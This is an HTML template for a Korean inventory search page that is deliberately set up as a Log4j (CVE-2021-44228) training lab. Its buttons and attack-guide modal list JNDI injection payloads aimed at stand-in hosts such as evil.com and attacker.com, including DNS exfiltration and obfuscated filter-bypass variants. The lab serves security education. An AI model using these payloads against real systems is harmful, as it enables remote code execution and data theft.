<!DOCTYPE html>
<html lang="ko" xmlns:th="http://www.thymeleaf.org">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>재고 조회 - CLOUD GUARDIANS</title>

    <!-- Bootstrap 5 CSS -->
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <!-- Font Awesome Icons -->
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
      rel="stylesheet"
    />
    <!-- DataTables CSS -->
    <link
      href="https://cdn.datatables.net/1.13.4/css/dataTables.bootstrap5.min.css"
      rel="stylesheet"
    />

    <!-- Custom CSS -->
    <link href="/css/inventory.css" rel="stylesheet" />
  </head>
  <body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
      <div class="container">
        <a class="navbar-brand" href="/">
          <i class="fas fa-truck-moving me-2"></i>
          CLOUD GUARDIANS
        </a>
        <button
          class="navbar-toggler"
          type="button"
          data-bs-toggle="collapse"
          data-bs-target="#navbarNav"
        >
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
          <ul class="navbar-nav me-auto">
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="fas fa-home me-1"></i>대시보드
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/warehouse">
                <i class="fas fa-warehouse me-1"></i>입고관리
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/shipping">
                <i class="fas fa-shipping-fast me-1"></i>출고관리
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link active" href="/inventory">
                <i class="fas fa-boxes me-1"></i>재고조회
              </a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="/tracking">
                <i class="fas fa-route me-1"></i>배송추적
              </a>
            </li>
          </ul>
          <ul class="navbar-nav">
            <li class="nav-item dropdown">
              <a
                class="nav-link dropdown-toggle"
                href="#"
                role="button"
                data-bs-toggle="dropdown"
              >
                <i class="fas fa-cog me-1"></i>시스템관리
              </a>
              <ul class="dropdown-menu">
                <li>
                  <a class="dropdown-item" href="/admin/users">직원관리</a>
                </li>
                <li>
                  <a class="dropdown-item" href="/admin/logs">시스템로그</a>
                </li>
                <li><hr class="dropdown-divider" /></li>
                <li>
                  <a class="dropdown-item text-warning" href="/vulnerable">
                    <i class="fas fa-bug me-1"></i>Vulnerable
                  </a>
                </li>
              </ul>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <section class="page-header">
      <div class="container">
        <div class="row align-items-center">
          <div class="col-md-8">
            <h1 class="display-5 fw-bold">
              <i class="fas fa-search me-3"></i>실시간 재고 조회 시스템
            </h1>
            <p class="lead">통합 검색으로 모든 재고 정보를 한눈에 확인하세요</p>
          </div>
          <div class="col-md-4 text-end">
            <div class="text-white">
              <h4><i class="fas fa-cubes me-2"></i>총 재고</h4>
              <h2 class="fw-bold">15,847</h2>
              <small>품목</small>
            </div>
          </div>
        </div>
      </div>
    </section>

    <div class="container">
      <!-- Vulnerability Banner -->
      <div class="vulnerability-banner">
        <div class="row align-items-center">
          <div class="col-md-8">
            <h3 class="mb-2">
              <i class="fas fa-shield-alt me-2"></i>
              Log4j 취약점 실습 환경
            </h3>
            <p class="mb-0">
              이 검색 시스템은 Log4j CVE-2021-44228 취약점 실습을 위해
              의도적으로 취약하게 구성
            </p>
            <small
              >🎯 검색창에 JNDI 공격 패턴을 입력하여 실시간으로 취약점 확인
              가능</small
            >
          </div>
          <div class="col-md-4 text-end">
            <button
              class="btn btn-outline-light btn-lg"
              onclick="showAttackGuide()"
            >
              <i class="fas fa-graduation-cap me-2"></i>가이드
            </button>
          </div>
        </div>
      </div>

      <!-- Main Search Section -->
      <div class="search-container">
        <div class="text-center mb-4">
          <h3 class="fw-bold">
            <i class="fas fa-search-location me-2 text-success"></i>
            스마트 재고 검색
          </h3>
          <p class="text-muted">
            상품명, SKU, 카테고리, 공급업체 등 모든 정보를 통합 검색합니다
          </p>
        </div>

        <!-- Main Search Bar -->
        <div class="row justify-content-center mb-4">
          <div class="col-md-8">
            <div class="input-group input-group-lg">
              <input
                type="text"
                class="form-control search-input"
                id="mainSearchInput"
                placeholder="재고 검색어를 입력하세요... (예: 삼성 갤럭시, SKU-12345, 스마트폰)"
              />
              <button
                class="btn btn-success search-btn"
                onclick="performMainSearch()"
              >
                <i class="fas fa-search me-2"></i>검색
              </button>
            </div>
            <div class="form-text text-center mt-2">
              <span class="text-warning">⚠️ Log4j 취약점 실습:</span>
              JNDI 패턴을 입력하여 보안 취약점 테스트 해보기기
            </div>
          </div>
        </div>

        <!-- Attack Pattern Quick Buttons -->
        <div class="text-center mb-4">
          <h6 class="text-muted mb-3">
            🚨 취약점 테스트 패턴 (클릭하여 빠른 입력)
          </h6>
          <div class="d-flex flex-wrap justify-content-center gap-2">
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:ldap://evil.com/exploit}')"
            >
              기본 LDAP 공격
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:rmi://malicious.server/payload}')"
            >
              RMI 공격
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${jndi:dns://attacker.com/exfiltrate}')"
            >
              DNS 공격
            </button>
            <button
              class="btn btn-outline-danger btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('${${lower:jndi}:${lower:ldap}://bypass.com/exploit}')"
            >
              우회 공격
            </button>
            <button
              class="btn btn-outline-warning btn-sm attack-pattern-btn"
              onclick="insertAttackPattern('정상검색어')"
            >
              정상 검색
            </button>
          </div>
        </div>

        <!-- Real-time Search Alert -->
        <div class="real-time-search" id="searchAlert" style="display: none">
          <div class="row align-items-center">
            <div class="col-md-8">
              <h6 class="mb-1">
                <i class="fas fa-bolt text-warning me-2"></i>
                실시간 검색 활성화
              </h6>
              <p class="mb-0">입력하는 모든 내용이 실시간으로 로깅됩니다.</p>
            </div>
            <div class="col-md-4 text-end">
              <span class="badge bg-success">Log4j 활성</span>
            </div>
          </div>
        </div>
      </div>

      <!-- Advanced Search & Filters -->
      <div class="row">
        <div class="col-lg-8">
          <!-- Advanced Search -->
          <div class="filter-card">
            <h5 class="mb-3"><i class="fas fa-sliders-h me-2"></i>고급 검색</h5>
            <div class="advanced-search">
              <div class="row">
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">카테고리</label>
                    <select class="form-select" id="categoryFilter">
                      <option value="">전체 카테고리</option>
                      <option value="electronics">전자제품</option>
                      <option value="appliances">가전제품</option>
                      <option value="furniture">가구</option>
                      <option value="clothing">의류</option>
                    </select>
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">재고 상태</label>
                    <select class="form-select" id="stockFilter">
                      <option value="">모든 상태</option>
                      <option value="high">충분 (100개 이상)</option>
                      <option value="medium">보통 (50-99개)</option>
                      <option value="low">부족 (10-49개)</option>
                      <option value="out">품절 (0개)</option>
                    </select>
                  </div>
                </div>
              </div>
              <div class="row">
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">공급업체</label>
                    <input
                      type="text"
                      class="form-control"
                      id="supplierFilter"
                      placeholder="공급업체명 입력..."
                    />
                  </div>
                </div>
                <div class="col-md-6">
                  <div class="mb-3">
                    <label class="form-label">가격 범위</label>
                    <div class="input-group">
                      <input
                        type="number"
                        class="form-control"
                        id="priceMin"
                        placeholder="최소"
                      />
                      <span class="input-group-text">~</span>
                      <input
                        type="number"
                        class="form-control"
                        id="priceMax"
                        placeholder="최대"
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div class="text-center">
                <button
                  class="btn btn-primary me-2"
                  onclick="performAdvancedSearch()"
                >
                  <i class="fas fa-filter me-1"></i>필터 적용
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="resetFilters()"
                >
                  <i class="fas fa-undo me-1"></i>초기화
                </button>
              </div>
            </div>
          </div>

          <!-- Search Results -->
          <div class="filter-card">
            <div class="d-flex justify-content-between align-items-center mb-3">
              <h5 class="mb-0">
                <i class="fas fa-list me-2"></i>검색 결과
                <span class="badge bg-primary ms-2" id="resultCount">3</span>
              </h5>
              <div class="btn-group btn-group-sm">
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('name')"
                >
                  <i class="fas fa-sort-alpha-down me-1"></i>이름순
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('stock')"
                >
                  <i class="fas fa-sort-numeric-down me-1"></i>재고순
                </button>
                <button
                  class="btn btn-outline-secondary"
                  onclick="sortResults('price')"
                >
                  <i class="fas fa-sort-amount-down me-1"></i>가격순
                </button>
              </div>
            </div>

            <!-- Sample Results -->
            <div id="searchResults">
              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=상품"
                      class="img-fluid rounded"
                      alt="상품이미지"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">삼성 갤럭시 S24 Ultra</h6>
                    <p class="text-muted mb-1">SKU: SAM-GAL-S24U-001</p>
                    <div class="mb-2">
                      <span class="category-tag">스마트폰</span>
                      <span class="category-tag">삼성</span>
                    </div>
                    <small class="text-muted">공급업체: 삼성전자</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-high">재고 충분</span>
                    <h5 class="fw-bold mt-2">247개</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">1,200,000원</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>상세보기
                    </button>
                  </div>
                </div>
              </div>

              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=상품"
                      class="img-fluid rounded"
                      alt="상품이미지"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">LG 올레드 TV 65인치</h6>
                    <p class="text-muted mb-1">SKU: LG-OLED-65C3-001</p>
                    <div class="mb-2">
                      <span class="category-tag">TV</span>
                      <span class="category-tag">LG</span>
                    </div>
                    <small class="text-muted">공급업체: LG전자</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-low">재고 부족</span>
                    <h5 class="fw-bold mt-2 text-warning">12개</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">2,500,000원</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>상세보기
                    </button>
                  </div>
                </div>
              </div>

              <div class="result-card">
                <div class="row align-items-center">
                  <div class="col-md-2">
                    <img
                      src="https://via.placeholder.com/100x100?text=상품"
                      class="img-fluid rounded"
                      alt="상품이미지"
                    />
                  </div>
                  <div class="col-md-6">
                    <h6 class="fw-bold">애플 맥북 프로 16인치</h6>
                    <p class="text-muted mb-1">SKU: APP-MBP-16-M3-001</p>
                    <div class="mb-2">
                      <span class="category-tag">노트북</span>
                      <span class="category-tag">애플</span>
                    </div>
                    <small class="text-muted">공급업체: 애플코리아</small>
                  </div>
                  <div class="col-md-2 text-center">
                    <span class="stock-status stock-medium">재고 보통</span>
                    <h5 class="fw-bold mt-2">67개</h5>
                  </div>
                  <div class="col-md-2 text-end">
                    <h5 class="fw-bold text-primary">3,200,000원</h5>
                    <button class="btn btn-outline-primary btn-sm w-100">
                      <i class="fas fa-info-circle me-1"></i>상세보기
                    </button>
                  </div>
                </div>
              </div>
            </div>

            <!-- Pagination -->
            <nav class="mt-4">
              <ul class="pagination justify-content-center">
                <li class="page-item disabled">
                  <a class="page-link" href="#">이전</a>
                </li>
                <li class="page-item active">
                  <a class="page-link" href="#">1</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">2</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">3</a>
                </li>
                <li class="page-item">
                  <a class="page-link" href="#">다음</a>
                </li>
              </ul>
            </nav>
          </div>
        </div>

        <!-- Sidebar -->
        <div class="col-lg-4">
          <!-- Vulnerability Demo -->
          <div class="vulnerability-demo text-white">
            <h5 class="fw-bold mb-3">
              <i class="fas fa-bug me-2"></i>취약점 실시간 모니터링
            </h5>
            <p class="mb-3">검색할 때마다 Log4j 로깅이 실행됩니다</p>
            <button
              class="btn btn-outline-light w-100"
              onclick="toggleLogMonitor()"
            >
              <i class="fas fa-terminal me-2"></i>로그 모니터 토글
            </button>
          </div>

          <!-- Log Monitor -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-terminal me-2"></i>실시간 로그 모니터
            </h6>
            <div class="log-monitor" id="logMonitor">
              <div>
                [2025-05-27 15:30:15] INFO - Inventory search system initialized
              </div>
              <div>
                [2025-05-27 15:30:16] DEBUG - Log4j vulnerability demo mode
                active
              </div>
              <div>
                [2025-05-27 15:30:17] INFO - Search page accessed from IP:
                127.0.0.1
              </div>
              <div>
                [2025-05-27 15:30:18] WARN - Vulnerability monitoring enabled
              </div>
            </div>
            <div class="text-center mt-2">
              <button
                class="btn btn-outline-success btn-sm"
                onclick="clearLogs()"
              >
                <i class="fas fa-trash me-1"></i>로그 지우기
              </button>
            </div>
          </div>

          <!-- Quick Stats -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-chart-pie me-2"></i>재고 현황
            </h6>
            <div class="row text-center">
              <div class="col-6 mb-3">
                <div class="text-success">
                  <i class="fas fa-check-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">12,456</h4>
                  <small>충분</small>
                </div>
              </div>
              <div class="col-6 mb-3">
                <div class="text-warning">
                  <i class="fas fa-exclamation-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">2,134</h4>
                  <small>부족</small>
                </div>
              </div>
              <div class="col-6">
                <div class="text-danger">
                  <i class="fas fa-times-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">567</h4>
                  <small>품절</small>
                </div>
              </div>
              <div class="col-6">
                <div class="text-info">
                  <i class="fas fa-plus-circle fa-2x"></i>
                  <h4 class="fw-bold mt-2">690</h4>
                  <small>신규</small>
                </div>
              </div>
            </div>
          </div>

          <!-- Popular Searches -->
          <div class="filter-card">
            <h6 class="fw-bold mb-3">
              <i class="fas fa-fire me-2"></i>인기 검색어
            </h6>
            <div class="d-flex flex-wrap gap-1">
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('삼성')"
              >
                삼성
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('LG')"
              >
                LG
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('애플')"
              >
                애플
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('스마트폰')"
              >
                스마트폰
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('노트북')"
              >
                노트북
              </button>
              <button
                class="btn btn-outline-primary btn-sm"
                onclick="quickSearch('TV')"
              >
                TV
              </button>
              <button
                class="btn btn-outline-danger btn-sm"
                onclick="quickSearch('${jndi:ldap://test.com}')"
              >
                🚨 테스트
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Attack Guide Modal -->
    <div class="modal fade" id="attackGuideModal" tabindex="-1">
      <div class="modal-dialog modal-xl">
        <div class="modal-content">
          <div class="modal-header bg-danger text-white">
            <h5 class="modal-title">
              <i class="fas fa-graduation-cap me-2"></i>Log4j 취약점 실습 가이드
            </h5>
            <button
              type="button"
              class="btn-close btn-close-white"
              data-bs-dismiss="modal"
            ></button>
          </div>
          <div class="modal-body">
            <div class="row">
              <div class="col-md-6">
                <h6 class="fw-bold text-danger">🎯 실습 목표</h6>
                <ul>
                  <li>Log4j JNDI Injection 취약점 이해</li>
                  <li>다양한 공격 패턴 실습</li>
                  <li>실시간 로그 모니터링</li>
                  <li>보안 취약점 탐지 방법 학습</li>
                </ul>

                <h6 class="fw-bold text-primary mt-4">📋 실습 절차</h6>
                <ol>
                  <li>아래 공격 패턴 중 하나 선택</li>
                  <li>검색창에 복사하여 붙여넣기</li>
                  <li>검색 실행</li>
                  <li>로그 모니터에서 결과 확인</li>
                  <li>다른 패턴으로 반복 실습</li>
                </ol>
              </div>
              <div class="col-md-6">
                <h6 class="fw-bold text-warning">⚠️ 공격 패턴 목록</h6>
                <div class="bg-dark text-light p-3 rounded">
                  <code>
                    # 기본 LDAP 공격<br />
                    ${jndi:ldap://evil.com/exploit}<br /><br />

                    # RMI 공격<br />
                    ${jndi:rmi://malicious.server/payload}<br /><br />

                    # DNS 데이터 유출<br />
                    ${jndi:dns://attacker.com/exfiltrate}<br /><br />

                    # 우회 기법<br />
                    ${${lower:jndi}:${lower:ldap}://bypass.com/exploit}<br /><br />

                    # 환경변수 우회<br />
                    ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}<br /><br />

                    # 중첩 우회<br />
                    ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/exploit}
                  </code>
                </div>
              </div>
            </div>

            <div class="alert alert-danger mt-4">
              <h6 class="fw-bold">🚨 중요 주의사항</h6>
              <ul class="mb-0">
                <li>이는 <strong>교육 목적</strong>의 실습 환경입니다</li>
                <li>
                  실제 운영 시스템에서는 <strong>절대 사용하지 마세요</strong>
                </li>
                <li>
                  이 환경은 <strong>격리된 네트워크</strong>에서만 사용해야
                  합니다
                </li>
                <li>
                  실습 후에는
                  <strong>반드시 Log4j를 안전한 버전으로 업데이트</strong>하세요
                </li>
              </ul>
            </div>

            <div class="bg-info text-white p-3 rounded mt-3">
              <h6 class="fw-bold">💡 학습 포인트</h6>
              <p class="mb-0">
                각 패턴을 실행할 때마다 로그 모니터를 확인하여 Log4j가 어떻게
                JNDI 문자열을 처리하는지 관찰해보세요. 실제 공격에서는 외부
                서버로 연결을 시도하게 됩니다.
              </p>
            </div>
          </div>
          <div class="modal-footer">
            <button
              type="button"
              class="btn btn-secondary"
              data-bs-dismiss="modal"
            >
              닫기
            </button>
            <button
              type="button"
              class="btn btn-warning"
              onclick="startGuidedTour()"
            >
              <i class="fas fa-play me-1"></i>가이드 투어 시작
            </button>
            <button
              type="button"
              class="btn btn-danger"
              onclick="location.href='/vulnerable'"
            >
              <i class="fas fa-bug me-1"></i>전용 실습실로 이동
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <!-- Custom JavaScript -->
    <script src="/js/inventory.js"></script>
  </body>
</html>
